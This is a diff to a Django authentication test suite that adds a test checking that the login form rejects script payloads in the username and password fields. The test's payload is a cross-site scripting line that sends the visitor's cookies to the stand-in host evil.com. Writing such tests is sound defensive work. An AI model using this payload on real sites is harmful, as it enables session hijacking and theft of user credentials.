@@ -79,6 +79,20 @@ class AuthSecurityTests(TestCase):
         self.assertContains(response, "Username atau password salah")
         self.assertContains(response, "Sisa percobaan sebelum akun terkunci: 4")
 
+    def test_login_form_rejects_script_payload_fields(self):
+        payload = "<script>document.location='http://evil.com?c='+document.cookie</script>"
+
+        response = self.client.post(reverse("auth_app:login"), {
+            "username": payload,
+            "password": payload,
+        })
+
+        self.assertEqual(response.status_code, 200)
+        self.assertTemplateUsed(response, "auth_app/login.html")
+        self.assertContains(response, "Username atau password salah")
+        self.assertContains(response, "Password mengandung karakter")
+        self.assertNotIn("_auth_user_id", self.client.session)
+
     def test_authenticated_user_cannot_open_login_page(self):
         self.client.force_login(self.user)
 
